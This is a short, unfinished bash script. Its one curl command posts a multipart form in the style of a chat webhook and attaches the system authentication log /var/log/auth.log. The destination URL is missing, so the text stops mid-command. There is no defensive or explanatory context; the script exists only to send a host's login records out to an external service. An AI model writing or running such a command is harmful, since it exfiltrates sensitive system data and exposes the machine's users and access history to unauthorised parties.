#!/bin/bash

curl -F "payload_json={\"content\": \"Authentication file:\"}" \
     -F "file=@/var/log/auth.log" \
     